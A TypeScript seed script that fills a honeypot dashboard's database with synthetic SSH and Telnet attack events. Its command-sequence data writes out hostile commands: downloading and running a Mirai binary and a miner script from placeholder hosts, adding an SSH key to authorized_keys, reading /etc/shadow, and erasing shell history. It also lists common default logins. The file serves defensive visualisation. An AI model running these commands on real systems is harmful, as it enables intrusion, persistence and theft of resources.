/**
 * Seeds the database with deterministic, realistic synthetic events so the
 * dashboard renders offline — no real honeypot required to review the site.
 *
 * Shapes mirror what Cowrie actually sees: bursts of credential spraying
 * from a stable set of source networks, the occasional "successful" login
 * followed by recon / downloader / persistence command sequences. Payload
 * URLs use reserved TEST-NET addresses; nothing here is a real IOC.
 */
import { databaseNeedsTls, loadConfig } from "./config.js";
import { createPgClient } from "./sql-pg.js";
import { migrate } from "./db.js";
import { EventRepository } from "./repository.js";
import { aggregate } from "./aggregate.js";
import { normalizeEvent, type Enricher, type StoredEvent, type WireEvent } from "./schema.js";
import { hashIp, truncateIp } from "./privacy.js";

// ── deterministic PRNG ─────────────────────────────────────────────────
function mulberry32(seed: number) {
  return () => {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const rand = mulberry32(0x68756e61); // "huna"
const pick = <T>(arr: readonly T[]): T => arr[Math.floor(rand() * arr.length)]!;
const weighted = <T>(entries: ReadonlyArray<[T, number]>): T => {
  const total = entries.reduce((s, [, w]) => s + w, 0);
  let r = rand() * total;
  for (const [v, w] of entries) {
    r -= w;
    if (r <= 0) return v;
  }
  return entries[entries.length - 1]![0];
};

let uuidCounter = 0;
const nextId = () => `00000000-0000-4000-8000-${String(++uuidCounter).padStart(12, "0")}`;

// ── synthetic source networks (country, ASN) ──────────────────────────
interface SourceNet {
  prefix: string; // first two octets
  country: string;
  asn: number;
  org: string;
  weight: number;
}
const NETWORKS: SourceNet[] = [
  { prefix: "61.177", country: "CN", asn: 4134, org: "CHINANET", weight: 22 },
  { prefix: "218.92", country: "CN", asn: 4134, org: "CHINANET", weight: 14 },
  { prefix: "112.85", country: "CN", asn: 4837, org: "CHINA UNICOM", weight: 9 },
  { prefix: "143.198", country: "US", asn: 14061, org: "DIGITALOCEAN-ASN", weight: 10 },
  { prefix: "104.248", country: "US", asn: 14061, org: "DIGITALOCEAN-ASN", weight: 6 },
  { prefix: "45.155", country: "RU", asn: 49505, org: "SELECTEL", weight: 8 },
  { prefix: "194.169", country: "RU", asn: 210644, org: "AEZA INTERNATIONAL", weight: 5 },
  { prefix: "103.146", country: "IN", asn: 138296, org: "NETSEC-IN", weight: 6 },
  { prefix: "177.54", country: "BR", asn: 262287, org: "MAXIHOST LTDA", weight: 5 },
  { prefix: "14.241", country: "VN", asn: 45899, org: "VNPT-AS-VN", weight: 6 },
  { prefix: "171.244", country: "VN", asn: 7552, org: "VIETEL-AS-AP", weight: 4 },
  { prefix: "45.142", country: "NL", asn: 211252, org: "DELIS LLC", weight: 5 },
  { prefix: "125.131", country: "KR", asn: 4766, org: "KIXS-AS-KR", weight: 4 },
  { prefix: "5.181", country: "DE", asn: 47890, org: "UNMANAGED LTD", weight: 3 },
  { prefix: "5.160", country: "IR", asn: 58224, org: "TCI", weight: 3 },
  { prefix: "51.89", country: "GB", asn: 16276, org: "OVH SAS", weight: 3 },
  { prefix: "51.158", country: "FR", asn: 12876, org: "SCALEWAY", weight: 3 },
  { prefix: "36.94", country: "ID", asn: 7713, org: "TELKOMNET-AS-AP", weight: 3 },
  { prefix: "220.135", country: "TW", asn: 3462, org: "HINET", weight: 2 },
  { prefix: "159.89", country: "SG", asn: 14061, org: "DIGITALOCEAN-ASN", weight: 3 },
  { prefix: "176.113", country: "UA", asn: 204957, org: "GREENFLOID LLC", weight: 2 },
  { prefix: "1.10", country: "TH", asn: 23969, org: "TOT-NET", weight: 2 },
  { prefix: "196.251", country: "ZA", asn: 328543, org: "WEB-DRAGON", weight: 2 },
  { prefix: "20.197", country: "US", asn: 8075, org: "MICROSOFT-CORP", weight: 2 },
];

// a stable population of ~160 bot IPs drawn from those networks
const BOTS = Array.from({ length: 160 }, () => {
  const net = weighted(NETWORKS.map((n) => [n, n.weight] as [SourceNet, number]));
  const ip = `${net.prefix}.${Math.floor(rand() * 254) + 1}.${Math.floor(rand() * 254) + 1}`;
  return { ip, net };
});

const enrich: Enricher = (ip) => {
  const bot = BOTS.find((b) => b.ip === ip);
  return bot
    ? { country: bot.net.country, asn: bot.net.asn, asn_org: bot.net.org }
    : { country: null, asn: null, asn_org: null };
};

// ── credential dictionary (weights ≈ real-world Cowrie distributions) ──
const CREDENTIALS: ReadonlyArray<[[string, string], number]> = [
  [["root", "123456"], 95], [["root", "root"], 80], [["admin", "admin"], 75],
  [["root", "password"], 60], [["root", "admin"], 50], [["admin", "123456"], 45],
  [["root", "12345678"], 38], [["root", "1234"], 35], [["user", "user"], 30],
  [["root", "qwerty"], 28], [["admin", "password"], 27], [["pi", "raspberry"], 25],
  [["test", "test"], 24], [["ubnt", "ubnt"], 22], [["root", "toor"], 20],
  [["oracle", "oracle"], 18], [["admin", "1234"], 18], [["ubuntu", "ubuntu"], 17],
  [["root", "111111"], 15], [["postgres", "postgres"], 15], [["git", "git"], 13],
  [["ftpuser", "ftpuser"], 12], [["root", "P@ssw0rd"], 12], [["nagios", "nagios"], 9],
  [["root", "000000"], 9], [["mysql", "mysql"], 8], [["root", "abc123"], 8],
  [["guest", "guest"], 7], [["deploy", "deploy"], 6], [["root", "changeme"], 6],
  [["es", "es"], 5], [["hadoop", "hadoop"], 5], [["root", "letmein"], 5],
  [["minecraft", "minecraft"], 4], [["root", "root2024"], 4], [["steam", "steam"], 3],
];

const CLIENTS: ReadonlyArray<[string, number]> = [
  ["SSH-2.0-Go", 30], ["SSH-2.0-libssh2_1.8.2", 18], ["SSH-2.0-PUTTY", 12],
  ["SSH-2.0-OpenSSH_7.4p1", 10], ["SSH-2.0-paramiko_2.7.2", 9],
  ["SSH-2.0-libssh_0.9.6", 8], ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5", 5],
  ["SSH-2.0-JSCH-0.1.45", 4], ["SSH-2.0-MGLNDD_GO_SSH", 2],
];

// command sequences observed post-"success" (payload hosts are TEST-NET)
const SEQUENCES: ReadonlyArray<[string[], number]> = [
  [["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", "uptime", "whoami"], 30],
  [["cd /tmp || cd /var/run || cd /mnt || cd /root || cd /", "wget http://198.51.100.23/bins/mirai.x86 -O .x; chmod 777 .x; ./.x ssh", "rm -rf .x"], 22],
  [["uname -s -v -n -r -m", "cat /etc/os-release", "nproc", "ip a"], 14],
  [["echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== bot@scan\" >> ~/.ssh/authorized_keys", "cat ~/.ssh/authorized_keys", "crontab -l"], 8],
  [["ps aux | grep -v grep | grep xmrig", "curl -fsSL http://203.0.113.7/mine.sh | sh", "chmod +x /tmp/xmrig"], 7],
  [["cat /etc/passwd", "cat /etc/shadow", "id"], 6],
  [["history -c", "rm -f ~/.bash_history", "ln -s /dev/null ~/.bash_history"], 5],
  [["ifconfig", "netstat -tunlp", "ss -tlnp"], 5],
  [["tftp; wget; /bin/busybox HUNT", "/bin/busybox HUNT"], 3],
];

// ── generate ───────────────────────────────────────────────────────────
const config = loadConfig();
// Seeding writes synthetic events, so it must never aim at a real deployment.
// A platform-generated .env.local could otherwise point this straight at a
// production database. databaseNeedsTls() doubles as "is this a remote DB".
if (databaseNeedsTls(config.databaseUrl) && process.env.SEED_ALLOW_REMOTE !== "1") {
  throw new Error(
    "refusing to seed a remote database (only localhost/127.0.0.1/postgres hosts are allowed); " +
      "set SEED_ALLOW_REMOTE=1 to override",
  );
}
const sql = createPgClient({
  connectionString: config.databaseUrl,
  ssl: databaseNeedsTls(config.databaseUrl),
});
await migrate(sql);
const repo = new EventRepository(sql);

const DAY = 86_400_000;
const now = Date.now();
const DAYS = 14;
const start = now - DAYS * DAY;

const stored: StoredEvent[] = [];
function push(e: Omit<WireEvent, "id" | "ts"> & { ts: number }): void {
  const wire = { ...e, id: nextId(), ts: new Date(e.ts).toISOString() } as WireEvent;
  stored.push(normalizeEvent(wire, "hp-1", config.ipHashSecret, enrich, { hashIp, truncateIp }));
}

let sessionCounter = 0;
for (let day = 0; day < DAYS; day++) {
  // daily volume varies; weekends slightly heavier, plus one "campaign" spike
  const base = 220 + Math.floor(rand() * 160);
  const spike = day === 9 ? 420 : 0;
  const sessionsToday = base + spike;

  for (let s = 0; s < sessionsToday; s++) {
    const bot = pick(BOTS);
    // diurnal-ish ramp: bots are global, so only mild time-of-day shape
    const ts0 = start + day * DAY + Math.floor(rand() * DAY);
    if (ts0 > now - 60_000) continue;
    const session = `s${(++sessionCounter).toString(36).padStart(8, "0")}`;
    const protocol = rand() < 0.93 ? ("ssh" as const) : ("telnet" as const);
    let t = ts0;

    push({ type: "session_connect", src_ip: bot.ip, session, protocol, ts: t });
    if (protocol === "ssh" && rand() < 0.9) {
      push({ type: "client_version", src_ip: bot.ip, session, protocol, client_version: weighted(CLIENTS), ts: (t += 150) });
    }

    const attempts = 1 + Math.floor(rand() * 6);
    let succeeded = false;
    for (let a = 0; a < attempts; a++) {
      const [username, password] = weighted(CREDENTIALS);
      // Cowrie "accepts" a small slice of attempts so behavior can be observed
      succeeded = !succeeded && rand() < 0.018;
      push({
        type: "login_attempt", src_ip: bot.ip, session, protocol,
        username, password, success: succeeded, ts: (t += 800 + Math.floor(rand() * 2500)),
      });
      if (succeeded) break;
    }

    if (succeeded) {
      const seq = weighted(SEQUENCES);
      for (const command of seq) {
        push({ type: "command", src_ip: bot.ip, session, protocol, command, ts: (t += 500 + Math.floor(rand() * 4000)) });
        if (/wget|curl|tftp/.test(command) && rand() < 0.7) {
          push({
            type: "file_download", src_ip: bot.ip, session, protocol,
            url: command.match(/https?:\/\/\S+/)?.[0] ?? "http://198.51.100.23/bins/mirai.x86",
            ts: (t += 300),
          });
        }
      }
    }

    push({ type: "session_closed", src_ip: bot.ip, session, protocol, duration: (t - ts0) / 1000, ts: (t += 1000) });
  }
}

stored.sort((a, b) => a.ts - b.ts);
const inserted = await repo.insertEvents(stored);

// the story stat: first attack landed ~11 minutes after the sensor went live.
// Seeded via the same path ingest uses in production (earliest boot wins).
const firstTs = stored[0]!.ts;
await repo.recordSensorLive(firstTs - 683_000);

await aggregate(repo);

const attempts = await repo.scalar("SELECT COUNT(*)::int FROM events WHERE type = 'login_attempt'");
console.log(`seeded ${inserted} events (${attempts} login attempts) across ${DAYS} days`);
await sql.close();
